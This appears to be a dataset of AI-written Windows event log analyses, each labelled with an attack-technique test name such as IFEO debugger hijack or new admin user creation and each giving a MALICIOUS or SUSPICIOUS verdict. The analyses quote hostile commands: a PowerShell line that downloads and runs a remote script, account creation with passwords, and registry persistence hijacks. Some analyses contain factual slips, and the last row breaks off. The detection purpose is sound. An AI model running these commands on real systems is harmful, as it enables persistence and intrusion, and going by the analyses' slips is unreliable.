COM Hijacking with RunDLL32 (Local Server Switch),"Upon reviewing the provided event logs, there are several indicators of potentially malicious activity which warrant further investigation. Here's a detailed analysis of the logs:

### Suspicious Behavior:

1. **PowerShell Activity**:
   - The PowerShell event log entries show a script with potentially malicious intent. The script executed on PowerShell creates registry keys under `HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}` with a suspicious value pointing to a DLL `.015_calc.dll`. Additionally, the script launches a process using `RUNDLL32.EXE` with arguments pointing to this CLSID.
   - Such behavior is characteristic of a technique known as ""DLL side-loading"" or malicious DLL injection, often used to evade detection or achieve persistence on a compromised system.

2. **Frequent Use of `wevtutil.exe` and `conhost.exe`**:
   - The logs capture numerous instances of `wevtutil.exe` and `conhost.exe` executed by the user `SERVER002\admin_test`. While `conhost.exe` is a legitimate process on Windows systems, excessive or unexplained executions can sometimes correlate with command-and-control activities or other suspicious operations.
   - `wevtutil.exe` is a Windows command-line utility for managing event logs. Similar to `conhost.exe`, its usage in a scripting context or alongside other suspicious commands can be indicative of log tampering or reconnaissance.

3. **Execution in `C:\Users\ADMIN_~1\AppData\Local\Temp`**:
   - This directory path is used in conjunction with DLL execution, indicating the operations are occurring in a temporary files context, a common area for malicious operations.
   
4. **High Integrity Level Execution**:
   - The PowerShell executions are at a high integrity level, suggesting the script is running with elevated privileges, which is another characteristic of potentially malicious activity.

5. **Microsoft Edge Update Activity**:
   - Multiple executions associated with Microsoft Edge updates could be innocuous as they appear to be auto-updates for Microsoft Edge. However, the presence of temporary directory paths, along with registry CLSID modifications, raises concern for masquerading or false-flag activities trying to mimic legitimate updates.

### Assessment of Situation:
The evidence collected from the Sysmon and PowerShell logs strongly suggests there is activity on this machine that aligns with known malicious tactics and techniques, such as registry modification for persistence, suspicious DLL usage, and elevated PowerShell scripting.

### Recommendations:
1. Perform a thorough integrity and security check of the systems mentioned in the logs, especially `Server002`.
2. Investigate the processes around `RUNDLL32.EXE` and `.015_calc.dll` to determine if the DLL is legitimate or a part of a rogue operation.
3. Review user `SERVER002\admin_test` activities and privileges, and ensure the user's actions were authorized.
4. Check the system's event logs for any anomalies or alterations, considering the heavy use of `wevtutil.exe`.
5. Consider isolating the affected system(s) pending a more in-depth forensic analysis to prevent potential lateral movement or further compromise.

### Resolution:
- **MALICIOUS**: Based on the existing evidence of registry manipulation, unusual PowerShell execution with high privileges, and potentially malicious use of DLLs, the logs point towards a compromise or malicious activity on the system. Immediate action should be taken to mitigate potential threats and protect sensitive assets."
IFEO Global Flags,"**Detailed Analysis:**

1. **System Log and Security Log Analysis:**
    - The logs indicate a number of time synchronization events involving svchost.exe and the Windows Time Service. Time synchronization using svchost.exe is typically benign, suggesting routine operations.

2. **Application Log Analysis:**
    - The entries associated with ""edgeupdate"" show that a service stopped twice within a few seconds. While unusual, this could simply be indicative of a service restart process, a software update, or a benign misconfiguration, typically involving the Microsoft Edge Update service.

3. **Sysmon Log Analysis:**
   - **Process Execution:**
     - The execution of `wevtutil.exe` and `conhost.exe` by `admin_test` suggests command-line activity typical of event log operations, which may involve an administrator.
     - Frequent executions of processes under the `MicrosoftEdgeUpdate` path are indicative of Edge browser updates. Notably, an execution chain leading to `MicrosoftEdgeUpdate.exe` involves TMP files, which can be a routine part of update operations.
   
   - **Registry Operations:**
     - The `cmd.exe` command to modify registry keys related to `notepad.exe`'s silent process exit settings stands out as particularly suspicious because it involves setting up a monitor process for notepad which executes `cmd.exe`. This could be indicative of an attempt to track or interfere with the `notepad.exe` process, potentially malicious.
     - Execution of `reg.exe` for registry modifications involving `Image File Execution Options` is common in attempts to intercept or modify process executions.

4. **Command-Line Arguments:**
   - The command executed by `cmd.exe` is suspicious:
     - `REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"" ...`
     - This is a common tactic used in malware or persistence techniques to replace, intercept, or redirect process launches.

5. **No PowerShell Logs:** 
   - There are no PowerShell logs available, which limits potential insight into script-based activity that could be occurring.

**Assessment:**

The investigation of these logs reveals a mixture of typical behavior and a notable suspicious activity:

- **Benign Activities:**
  - Routine time synchronization.
  - Frequent updates and execution of Microsoft Edge Update processes.

- **Suspicious Activities:**
  - Registry modifications targeting `notepad.exe`, typically indicative of malicious objectives.

Set Arbitrary Binary as Screensaver,"Based on the review of the provided logs, we have observed the following:

### Suspicious and Potentially Malicious Activity:

1. **Registry Modifications by cmd.exe:**
   - A `cmd.exe` process is seen executing a batch of registry modifications related to the screensaver configurations. The command line includes:
     - Export of registry key `HKEY_CURRENT_USER\Control Panel\Desktop`.
     - Copying `cmd.exe` to `C:\Windows\System32\evilscreensaver.scr`.
     - Modifying screensaver-related registry entries such as `ScreenSaveActive`, `ScreenSaveTimeout`, `ScreenSaverIsSecure`, and `SCRNSAVE.EXE`.
     - This activity is suspicious, as it suggests an attempt to establish a custom, potentially malicious screensaver, possibly to maintain persistence or for other nefarious purposes. The use of ""evilscreensaver.scr"" strongly implies malicious intent.

2. **`whoami.exe` and `conhost.exe` Usage:**
   - The usage of `whoami.exe` and subsequent execution of `conhost.exe` indicates attempts to enumerate user information, possibly to find out the currently logged-in user and session details.

3. **Use of High-level Privileges:**
   - The account `admin_test` is seen acquiring a high level of privileges (Event 4672) with multiple administrative rights, such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are often necessary for privilege escalation or executing administrative tasks without restrictions.

4. **Execution of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` are executed, implying potential manipulation or querying of event logs. This could be an attempt to delete or hide trace logs of other malicious activities.

### Risk Assessment:
The observed behaviors, especially the registry modifications to enable and configure a potentially malicious screensaver (e.g., evilscreensaver.scr), substantial use of high privileges, and suspicious command executions (`wevtutil.exe`, `cmd.exe` with specific malicious commands), collectively indicate malicious activity with potential compromise.

### Recommended Actions:
- **Immediate Investigation and Remediation:**
  - Discontinue network access for the affected system (Server002) to prevent further damage or lateral movement.
  - Conduct a detailed forensic analysis to understand the full scope and impact of the compromise.
  - Inspect and restore modified registry keys to their default and secure state.
  - Scan the system for malware or unauthorized files, especially `evilscreensaver.scr`.
  - Change all potentially compromised credentials and enforce Multi-Factor Authentication (MFA).
- **Review and Update Security Policies:**
  - Review privilege assignments and reduce unnecessary administrative rights.
  - Implement stricter monitoring and alerting for similar activities in the future.

Given the outlined findings and recommendations, the logs show clear indications of compromise. Therefore, the resolution is:
- **MALICIOUS** - The logs contain activity that we are confident is malicious."
Persistence using automatic execution of custom DLL during RDP session,"To analyze the provided Windows event logs for any indicators of malicious activity, we need to assess the logs based on common signs of compromise such as unusual process execution, privilege escalation, and suspicious command-line arguments. Here's a detailed analysis based on the logs:

### Security Logs

1. **Event ID 4624 (Successful Logon) and Event ID 4634 (Logoff):** 
   - The user `admin_test` logs on (`4634`) and off (`4624`) with logon type 3, which indicates a network logon. 
   - Network logons are common, but the associated privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.`) seen in Event ID 4672 are high-level and could indicate a potential risk if this level of access wasn't expected or authorized.

2. **Event ID 4672 (Special Privileges Assigned):**
   - The presence of high-level privileges suggests that the account `admin_test` has significant power on the system. 

### System Logs

The system logs appear to show normal operations such as timezone settings and time synchronization events, without any immediate red flags for malicious activity.

### Sysmon Logs

1. **Unusual Command Executions:**
   - The execution of `cmd.exe` with a registry modification command (`reg add`) is concerning. The command `cmd.exe /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin"" /v Path /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f` indicates a direct modification to critical registry areas which could be used for persistence or evasion tactics.
   - The presence of processes like `wevtutil.exe` and `reg.exe` executing with `admin_test` privileges may suggest suspicious activity as they are often used by attackers for log manipulation and system configuration changes.

2. **Process Execution:**
   - The high frequency and rapid succession of process launches (e.g., `conhost.exe`, `wevtutil.exe`, `cmd.exe`, and others) in a short time span may indicate automated scripts or unauthorized administrative access.

### Combining Observations

The activities involving privilege execution, the specific processes run, and the registry modification are characteristic of potentially malicious behavior:

- **Registry Modification:** The registry change is particularly notable, as it could be an attempt to disable or alter security settings (`amsi.dll` is linked with the Anti-Malware Scan Interface).
- **High privileges:** Given the severe privileges assigned to `admin_test`, any misuse can lead to significant system compromise.

### Conclusion

Based on the analysis, the event logs exhibit signs indicative of potential compromise, particularly the registry modification command and the observed privilege level associated with `admin_test`. While further investigation is necessary to confirm malicious intents, these patterns do align with known tactics used in various forms of cyber-attacks.

### Resolution

**SUSPICIOUS** - The logs contain activities that deviate from normal expected behavior and suggest a potential security incident. Further investigation is warranted, such as:
- Verifying the legitimacy of the `admin_test` account and recent activities.
- Reviewing the context and intent behind the registry changes.
- Conducting a full audit of systems and network access patterns to ensure there are no existing breaches.

Immediate action could also involve isolating the system for a deeper forensic analysis and checking for IOCs (Indicators of Compromise) across other connected systems."
Create a new Windows admin user via .NET,"Upon reviewing the provided event logs, several patterns and indicators suggest potential malicious activity.

1. **PowerShell Activity**:
   - The PowerShell logs indicate the execution of a potentially malicious command. A script was downloaded and executed using PowerShell with the following command: 
     ```
     powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')}
     ```
   - This command uses `iex (Invoke-Expression)` and `net.webclient` to fetch and execute a script from the internet. This method is commonly used by attackers to execute arbitrary code on a system.
   - The script appears to be intended for persistence and potentially creating a new local administrator account (`CreateNewLocalAdmin_ART.ps1`), which is a strong indicator of compromise.

2. **Security Events**:
   - Multiple security-related events (Event ID 4672 and 4624) show an account named `admin_test` receiving elevated privileges repeatedly over a short period, indicating suspicious account activity. The account was used to create a new local user `NewLocalUser`, which hints at unauthorized user account creation.
   - Event IDs 4720 (user account creation), 4728 (adding a user to a group), and 4798 (user enumeration) suggest actions consistent with attempts to escalate privileges or persistence by adding the new user account to privileged groups, possibly the Administrators group.

3. **Sysmon Logs**:
   - Process creation events show executions of `svchost.exe`, `powershell.exe`, and subsequent subordinate processes. The pattern of executing PowerShell followed by network commands to manage user accounts (`net.exe`, `net1.exe`) aligns with known tactics used in attacks to create backdoors or increase accesses without authorization.
   - The execution of `net.exe` and `net1.exe` with user account management commands shows direct system manipulation, likely using system privileges.

4. **System and Application Logs**:
   - Time adjustments and service disruptions evident in the logs can be consistent with attacker attempts to cover tracks or disrupt logging mechanisms.

Based on the analysis:
- There are clear indications of unauthorized downloads and script execution using PowerShell.
- Account manipulation activities suggesting unauthorized account creation with elevated privileges.
- Presence of potentially unauthorized time changes in system logs that might indicate attempts to obfuscate actions.

**Assessment and Resolution**:
Given the extensive signs of privilege escalation, unauthorized account creation, PowerShell script execution from an untrusted source, and correlation with known malicious patterns, these logs suggest a compromised host.

**Resolution: MALICIOUS**.

**Guidance on How to Proceed**:
1. Isolate the affected host immediately to prevent further spread or damage.
2. Conduct a full forensic investigation to understand the scope of the compromise.
3. Check for any unauthorized accounts and changes made during the incident and revert or remove them.
4. Assess data exfiltration risks and review logs for any data access or transmission anomalies.
5. Enhance monitoring for similar activities across other systems.
6. Consider resetting all user credentials, especially those with elevated privileges.
7. Run a complete malware scan and remediate any detected threats.
8. Review current security policies and measures to ensure they can prevent similar attacks in the future."
Create a new Windows admin user,"### Analysis of Logs

Upon reviewing the provided log entries, there are several points of interest that stand out as potentially suspicious activities:

1. **Account Creation and Privilege Escalation:**
   - **Event ID 4720 & 4728 (Security Log):** A new user account named ""data.001_Admin"" was created and then added to the local Administrators group on SERVER002. The creation and elevation of this user account were initiated by the user ""admin_test"".
   - **Command Execution (Sysmon Event ID 1):** The command `cmd.exe /c net user /add ""data.001_Admin"" ""data_pass"" & net localgroup administrators ""data.001_Admin"" /add` was executed. This command is directly related to creating a new account and adding it to the Administrators group, which represents a significant privilege escalation tactic.

2. **Unusual Sequence of Processes:**
   - **Sysmon Logs:** A repetitive sequence of processes involving `wevtutil.exe` and `conhost.exe` are seen being executed by the user ""SERVER002\\admin_test"". The presence of `wevtutil.exe`, a utility for managing Windows Event logs, without clear context may also suggest attempts to tamper with or read event logs.

3. **Other Observations:**
   - **Process Integrity Levels:** Processes such as `cmd.exe`, `whoami.exe`, and `hostname.exe` are running with high integrity levels, suggesting they were executed with elevated privileges. Although this could be benign, context matters greatly and ties back to the suspicious account creation.
   - **Non-Interactive Logons (Event ID 4624 - Security Log):** There are system-level logons that might not align directly with the observed user actions but should be considered in the context of the timeline.

### Assessment

The actions observed in the logs, particularly the creation of a new privileged user account and the presence of command executions with parameters for privilege escalation, indicate a high risk of malicious activity. The account elevation and command execution suggest unauthorized access or a potential breach tactic for persistence or privilege escalation on the system.

### Resolution

**Resolution: MALICIOUS**

The logs indicate clear signs of malicious activity due to the unauthorized account creation and privilege escalation attempts. 

### Guidance

- **Immediate Action Needed:**
  - Disable the account ""data.001_Admin"" immediately and reset any passwords that might have been changed.
  - Conduct a thorough investigation on the ""SERVER002"" host to identify any potential backdoors or additional unauthorized changes.
  - Check for further malicious activity or presence of any scripts or malware designed to persist across reboots or evade detection.

- **Long-Term Measures:**
  - Ensure that account creation and privilege escalation activities are closely monitored and limited to specific administrative roles.
  - Implement stricter access controls and consider multi-factor authentication.
  - Regularly review audit logs and employ automated tools to detect unusual account activities.

This assessment suggests potential unauthorized access and should be addressed as a security incident.

Create a new Domain Account using PowerShell,"### Log Analysis

Upon reviewing the provided Windows event logs, here are the observations and analysis:

#### Noteworthy Events

1. **Process Execution and Command-Line Arguments:**
   - **PowerShell Execution**: A PowerShell script is being executed which involves creating a new user account (`data.002_Admin`) with password handling, enabling the user, and saving the user. The use of `ConvertTo-SecureString` with `-AsPlainText -Force` indicates password handling in a potentially insecure manner:
     ```
     ""CommandLine"":""\""powershell.exe\"" & {$SamAccountName = 'data.002_Admin', $AccountPassword = ConvertTo-SecureString 'data_pass123!' -AsPlainText -Force,...}""
     ```
   - **System Utilities**: Frequent occurrences of `whoami.exe`, `wevtutil.exe`, and `conhost.exe` are observed. While these by themselves are not inherently malicious, the pattern may suggest an attempt to query system information or manipulate event logs, which can be indicative of malicious activity.

2. **High Integrity Level Execution:**
   - Multiple processes, including those associated with PowerShell, are running with high integrity levels, indicating administrative privileges. This could suggest potential privilege escalation or misuse of administrative capabilities.

3. **Use of `wevtutil.exe`:**
   - The execution of `wevtutil.exe`, which is used to clear event logs or query for specific logs, is observed. This utility is often used by attackers to cover tracks or gather information.

4. **Time Changes:**
   - There are security events related to time changes. The system time was adjusted, which is often a technique utilized by malware to modify timestamps or evade detection. 

#### Potential Indicators of Compromise

- **Malicious PowerShell Activity**: The execution of PowerShell with a script to create user accounts and associated credentials is highly concerning. It is a classic indicator of potential lateral movement or establishing persistence on the system.
- **Administrative Account Misuse**: The user `SERVER002\admin_test` is frequently executing critical system and utility tasks, often associated with administrative functions. This pattern could suggest misuse or compromise of an administrative account.

#### Overall Assessment

- The presence of PowerShell scripts for user account manipulation and significant utility execution with high integrity levels strongly suggests potential malicious activity.
- The logs indicate behavior consistent with techniques commonly used in attacks, such as privilege escalation, lateral movement, or persistence mechanisms.

**Resolution:** **MALICIOUS**

### Recommendations

1. **Immediate Response:**
   - Isolate the affected system from the network to prevent potential lateral movement.
   - Conduct a comprehensive check for the creation of unauthorized accounts or alterations within the domain.

2. **Investigate Further:**
   - Trace the origin of the PowerShell and who executed it. Assess whether `SERVER002\admin_test` has been compromised.
   - Review other systems for signs of similar patterns and correlate findings for potential lateral movement.

3. **Prevent Future Incidents:**
   - Implement monitoring for PowerShell scripts that use inline clear-text passwords.
   - Enable advanced logging and monitoring for sensitive operations, particularly those involving administrative privileges.

By following these steps, we can mitigate the detected threat and strengthen defenses against similar incidents in the future."
Install Additional Authentication Packages,"### Detailed Log Analysis

#### **Security Logs:**
- **Event ID 4616:** Describes a successful time change event triggered by the ""LOCAL SERVICE"" account using ""svchost.exe"". Time changes can be normal due to synchronization or malicious if used to hide activities, but nothing in this suggests direct malicious intent alone.

#### **Sysmon Logs:**
- **Event ID 5:** Multiple instances of process creation are logged, notably many involving `conhost.exe`, `wevtutil.exe`, and `powershell.exe`. 
  - **PowerShell Execution:** Scripts executed with PowerShell are often suspicious if they involve registry changes or file downloads, as identified with command-lines that involve exporting or importing registry states (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa`), and copying of `.dll` files to `C:\Windows\System32`. These are typical of attacks trying to establish persistence or privilege escalation, especially apparent in logs where `filePWFilter.dll` is copied, which could be a password filter DLL.
  - **User `SERVER002\admin_test`:** The user context under which these processes operate indicates a logged-in administrative user executing scripts. This administrative privilege execution of PowerShell scripts that modify Windows authentication mechanisms is atypical and raises red flags.

#### **Application Logs:**
- **Event ID 16384:** Relates to the Software Protection Platform Service activity. Normal operations related to service protection and don't offer direct indicators of malicious behavior in context here.

#### **Windows PowerShell Logs:**
- **Event ID 600/400/403:** Indicates script operation initiation and completion. The execution details point to attempts at making registry modifications directly through PowerShell, targeting system policies relating importantly to LSA settings, often targeted for elevating permissions or altering authentication protocols illegitimately.

#### **System Logs:**
- **Event ID 24 and 1:** Capture time adjustments, consistent with other logs from the security log. Further scrutiny suggests normal synchronization, especially as they recur around exact timing intervals.

### Assessment and Findings
The log analysis indicates that:
- Several processes executed under an admin context attempted modifications typical of privilege escalation or persistence mechanisms.
- PowerShell scripts manipulating Local Security Authority (LSA) configurations through copying potentially suspicious `.dll` files into system directories exhibit behavior consistent with malicious intent.
- The time-change recorded does not immediately suggest anything beyond routine synchronization checks.

### Guidance
Before pronouncing the nature of these activities definitively as malicious, further investigation is recommended:
- Confirm if `filePWFilter.dll` is a legitimate application file or potentially harmful by examining its origin and signature.
- Gather insights into recent user activities under `SERVER002\admin_test` context to establish if performed actions were legitimate administrative tasks.
- Analyze any network connections or downloads that might have occurred around the time of these operations to identify potential command-and-control activity.

### Resolution
**Resolution: MALICIOUS**

Given the execution of admin-level PowerShell scripts designed to alter key security configurations without obvious legitimate need, especially involving potential credential manipulation, it suggests a high risk of compromise or malicious activity. Immediate action should be taken to scope the impact, secure assets, evaluate and strengthen system, user credential policies, and initiate incident response protocols."
Azure AD - Create a new user via Azure CLI,"Based on the examination of the logs provided, several activities indicate potentially suspicious behavior that warrants further investigation. Here is a summary of key findings:

### Suspicious Behaviors Identified:

1. **Time Manipulation Events:**
   - In the System and Security logs, there are several instances of time changes involving `svchost.exe`, which shows the old and new time adjustments. Though there can be legitimate reasons for system time adjustments, they sometimes are exploited for evasion by malware or attackers to alter timestamps, disrupt event log correlation, and bypass certain security controls.

2. **Unhandled PowerShell Activity:**
   - Extensive PowerShell activity involving an `az login` command, along with attempts to create and list Azure AD users, is logged. The commands use specific variables and credentials directly in the script, posing a potential security risk. There is no evidence to indicate that these were authorized administrative actions, and execution from paths like temp directories could suggest potential execution from phishing or malicious intrusion.

3. **Sysmon Log Analysis:**
   - Processes such as `powershell.exe` and `wevtutil.exe` are executed under the `SERVER002\admin_test` with high integrity levels. These processes, especially `wevtutil.exe`, exporting logs to a temporary location, can indicate attempts by an attacker to collect or clear logs to cover their tracks post-compromise.

4. **Console Host Executions:**
   - Frequent executions of `conhost.exe` in conjunction with `whoami.exe`, `powershell.exe`, and `wevtutil.exe` could indicate script-based automation often used in attack frameworks or malicious automation.

5. **Credential Use in Plain Text:**
   - The PowerShell script logs referenced contain what appear to be hardcoded credentials (`reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg`). This could be an indicator of poor credential management or potential leakage/exposure through logs.

### Assessment and Resolution:

- **Overall Risk:**
  The risk here involves potential compromise vectors, including misuse or exploitation of PowerShell scripts, particularly for creating and listing Azure Active Directory users, potential time-stomping for evasion, and suspicious handling of event logs.

- **Resolution: SUSPICIOUS**

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Monitor and audit Azure AD for new user account creations and any privilege escalations associated with them.
   - Conduct a comprehensive review of the `SERVER002\admin_test` activity, especially around the time window of these logs.

2. **Investigations:**
   - Investigate the legitimacy of the Azure PowerShell commands and determine if they align with internal usage policies or if they were unauthorized.
   - Review changes to system time and determine if any daemons, scripts, or third-party software could explain these events.

3. **Preventive Measures:**
   - Implement strict PowerShell logging policies and ensure script block logging is enabled for detailed insight.
   - Ensure time synchronization policies are consistent across the network and protected against unauthorized changes.

4. **Further Monitoring:**
   - Increase monitoring on sensitive accounts like administrative users, applying anomaly detection for unusual behavior or script execution.
   - Engage with relevant teams (e.g., identity management, IT operations) to verify system states align with intended configurations.

In conclusion, while there is not a definitive determination that the activities are certainly malicious (hence not labeled 'MALICIOUS'), the combination of indicators suggests the necessity for in-depth review and investigation to rule out compromise."
Modify Terminal Services DLL Path,"Upon analyzing the given Windows event logs, I've noticed several important events and behaviors:

**1. Suspicious ACL Modifications:**
   - **Event ID 4907 in Security Log**: There's an indication of a change in the security descriptor of `termsrv.dll` by the user `admin_test` using PowerShell. The command involves altering file access control lists (ACLs) and registry modifications, which can be an indicator of malicious intent, particularly to bypass restrictions or escalate privileges.

**2. Unusual Use of PowerShell:**
   - **PowerShell Command**: The logs contain PowerShell execution that modifies ACLs and Service DLL paths. The presence of complex scripting logic to manipulate DLLs (`termsrv.dll`) and update registry keys (`ServiceDll` value in the `TermService` parameters) suggests a potential attempt to alter or backdoor Terminal Services configurations.

**3. Time Synchronization Adjustments:**
   - **Event ID 4616 in Security Log**: There are time-related changes captured, which can be normal maintenance activity. However, if not planned, such changes might aid in masking malicious activities by desynchronizing logs.

**4. Execution of Windows Built-in Tools:**
   - **Sysmon Logs with Event ID 1 and 5**: Various Windows utilities like `HOSTNAME.EXE`, `whoami.exe`, `conhost.exe`, and `wevtutil.exe` were executed with the user `admin_test`. While these are legitimate tools, their execution in succession alongside potentially malicious PowerShell scripts raises suspicion.

**Assessment:**
- The combination of security descriptor changes on critical system DLLs, intricate PowerShell scripts modifying sensitive configurations, and specific tool executions suggest potential malicious activity aiming at system backdoors or privilege escalation on `Server002`.

**Threats and Risks Identified:**
- **Privilege Escalation**: Unauthorized permission modification and registry changes can lead to higher privilege execution.
- **Potential Backdoors**: Manipulating `termsrv.dll` and related registry settings can be part of a strategy to maintain unauthorized access or control over the host.

**Guidance and Resolution:**
- **Immediate Review**: Conduct a forensic examination of the PowerShell script executed and confirm any unauthorized changes to system files and registry.
- **Integrity and Security Checks**: Audit the system for any unauthorized user accounts or permissions.
- **Monitor and Contain**: Initiate a containment process to ensure no further unauthorized changes occur. Monitor network traffic for signs of data exfiltration or further compromises.
- **Host Isolation**: Consider isolating the affected system if ongoing malicious activity is suspected.

**Resolution: MALICIOUS**
- The logs indicate intentional unauthorized modifications, likely representing an exploitative or preparatory move for further system compromise. This activity requires immediate attention and remediation to prevent persistent threats."
IFEO Add Debugger,"Upon examining the provided logs, several activities stand out that may indicate potential suspicious behavior on the Windows host. Below is a detailed analysis:

1. **Reg.exe Usage for IFEO (Image File Execution Options)**:
   - The logs show the use of `cmd.exe` to modify the registry's Image File Execution Options (IFEO) for `calc.exe` by pointing the debugger to `cmd.exe`. This is a known method used by malicious actors for persistence or executing unwanted commands by leveraging a seemingly benign executable (`calc.exe` in this case).
   - Sysmon Event RecordID `17980` shows `cmd.exe` with the command line `REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe"" /v Debugger /d ""C:\Windows\System32\cmd.exe""`. This modification allows execution of `cmd.exe` whenever `calc.exe` is run, which could be leveraged for malicious intentions.
   - Following this event, `reg.exe` is seen making this registry change, further indicating potentially malicious intent.
   
2. **Service and Process Executions**:
   - Multiple instances of `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, and related Edge Update processes executing in sequence. While this could represent legitimate update activity, if these were unexpected or unauthorized, they warrant further scrutiny.

3. **Command Execution with Elevated Privileges**:
   - The system logs show operations under `NT AUTHORITY\SYSTEM`, which suggests either normal system operations or potential misuse if associated with unknown operations.
   - The operations and processes with elevated integrity levels need to be scrutinized if they are not typical for the CEO's machine usage patterns, especially the high volume of system-level operations in a short time frame.

4. **Frequent Use of Hostname & Whoami**:
   - While `hostname.exe` and `whoami.exe` are benign tools, they are frequently invoked in the logs. This activity could be normal or part of a batch/script to collect network and user information, potentially mapping for further actions.

**Assessment**:
The presence of registry modifications related to IFEO and disguised use of common OS tools strongly suggests abnormal and potentially malicious behavior. While there are normal-looking sys admin tasks and routine executables visible, the registry modification to hijack a commonly used application (`calc.exe`) is a significant indicator of compromise.

**Resolution**:
**MALICIOUS** - The registry modification activities identified, specifically in the use of IFEO to hijack `calc.exe` execution, are indicative of a potential attack tactic aimed at maintaining persistence or executing unauthorized actions.

**Guidance on How to Proceed**:
- Immediate review and normalization of the Image File Execution with Options for `calc.exe`.
- Conduct a full forensic investigation on the CEO's machine, checking for further signs of persistence mechanisms or additional compromises.
- Monitor network traffic for unusual out-bound connections that could suggest exfiltration or C2 traffic.
- Inspect any scripts or scheduled tasks configured to run `cmd.exe` or otherwise use these altered registry settings.
- Consider a wider probe across other critical systems for similar registry entries that might reflect a lateral move by an attacker.
- Based on findings, it may be necessary to isolate the affected machine to prevent spread or further compromise."
HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation),"Upon reviewing the provided logs, specific indicators and patterns suggest potential malicious activity. The key findings are as follows:

1. **Unusual PowerShell Activity**:
   - The logs show PowerShell being executed with a command line that modifies the registry's ""AutoRun"" setting to execute ""notepad.exe"". This behavior is suspicious as it attempts to persist and/or execute a seemingly benign application via autorun capabilities. While ""notepad.exe"" seems harmless, attackers often use inconspicuous applications as part of their techniques to establish persistence or obfuscate their actions.

2. **Processes Execution**:
   - Sequential execution of `hostname.exe`, `whoami.exe`, and `conhost.exe` in the user's Documents directory indicates possible reconnaissance or unusual script activity. These processes, common in enumeration activities, appear to run with elevated integrity, which could mean they have administrative privileges. While running these commands isn't inherently malicious, in context, they could suggest possible scripting or test efforts by an attacker.

3. **Time Manipulation**:
   - The system logs indicate a change in system time. This action, performed by `svchost.exe`, can be part of anti-forensics methods by attackers to disguise their activities, especially in a context of suspicious PowerShell activity.

4. **Elevation of Privileges**:
   - The user `admin_test` is consistently given numerous privileges, including SeDebugPrivilege, SeBackupPrivilege, etc. while logged in. The presence of high-level privileges aligns with potential escalation activities.

5. **Network Behavior**:
   - IP addresses used in security logins point to potential remote connections to the system that originated from external networks or locations that should be monitored for legitimacy and context of connection.

**Assessment**:
- **PowerShell's command execution** and **attempts to alter autorun properties** heavily suggest an attempt at persistence or malicious setup.
- **Series of high-integrity process executions** (hostname, whoami) in a sequence that flags potential misuse or system scanning.
- **Privilege assignment and system clock alterations** further hint at skilled operations indicative of exploration or set-up by an adversary.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately further investigate and trace the authoritative source of the PowerShell commands.
- Review any scripts or scheduled tasks that could have been established for persistence.
- Validate the legitimacy of IP addresses involved in logins.
- Consider isolating the affected machine and further scanning for potential indicators of compromise not visible in logs.
- Implement additional logging and monitoring for this host to detect further abnormalities.
"
Create a new user in a command prompt,"### Analysis of the Logs

After examining the provided logs, I identified several events that stand out due to their apparent deviations from usual activities or suggested malicious intent:

1. **Privileged Access and Strange Commands**:
   - In the security logs, Event ID 4672 indicates that `admin_test` was granted a series of high-level privileges, including `SeDebugPrivilege`, which could allow debugging processes and potentially modifying system processes or extracting sensitive data from them.
   - A critical event is captured in the Sysmon logs associated with `ProcessId` 4444, 2344, and 3632 where the `cmd.exe` executed the `net user /add ""data.001_CMD"" ""data.001_CMD!""` command, indicating that a new user account with potentially administrative privileges was created suspiciously. 
   - Follow-up with activation and changes to this user account are seen with Event IDs 4720 and 4722, where `data.001_CMD` seems to be activated and modified.

2. **Unusual Process Executions**:
   - Multiple executions of `wevtutil.exe` by `admin_test` at various times (Event Records 17951, 17955, and 17959) suggest manipulation or querying of event logs. This behavior can be a common tactic by attackers to cover their tracks.
   - Similarly, `hostname.exe` and `whoami.exe` executions are commonly used by attackers for reconnaissance purposes to gather information about the system environment and the currently logged-on user, respectively.

3. **Time Discrepancies**:
   - The Windows event logs show recurring attempts to change the system time via `svchost.exe` (indicated by EventIDs 4616 and Kernel-General ID 1 and 24). This technique can be used to disguise the timing of unauthorized activities and tamper with logs' timestamps.

### Assessment

The following findings suggest a possible compromise or malicious attempt on the system:

- **Anomalous Account Activity**: The creation and activation of a new user account without clear authorization through command-line utilities are significant indicators of compromise. Such accounts are often used to maintain persistence or elevate privileges surreptitiously.
- **Privileged Access Use**: The Use of high-level privileges, especially `SeDebugPrivilege`, in combination with executing system alteration commands, is suspicious and suggests potential malicious intent or post-exploitation activities.
- **Event Log Manipulation Tactics**: The usage of command utilities to potentially manipulate event logs points towards efforts to conceal actions taken on the system from investigators. This behavior elevates the risk profile of these activities, suggesting an attempt to obfuscate unauthorized access.

### Resolution

Given the severity and context of the activities observed within the log data:

**Resolution: MALICIOUS**

### Guidance and Next Steps

1. **Immediate Containment**: Isolate and disconnect the affected system (`Server002`) from the network to prevent further unauthorized access or lateral movement.
  
2. **User Account Inspection**: Disable the unauthorized user account `data.001_CMD` and review all accounts created or accessed around the incident period for legitimacy.
  
3. **Incident Investigation**: Initiate a detailed forensic analysis to trace how the unauthorized commands were executed, who initiated them, and how they gained initial entry (e.g., review ingress logs and endpoint security alerts).
  
4. **Log and System Auditing**: Review and secure event logs to prevent tampering and establish baselines for legitimate behavior across similar endpoints.

5. **Security Posture Review**: Consider implementing more robust logging, privileged access management, and endpoint detection and response (EDR) solutions to improve early detection and response capabilities for such activities in the future."
Replace binary of sticky keys,"Upon reviewing the provided Sysmon logs, there are multiple entries detailing process creations and file events on the Windows machine, ""Server002"". The activities of interest are as follows:

### Identified Anomalous Activities:
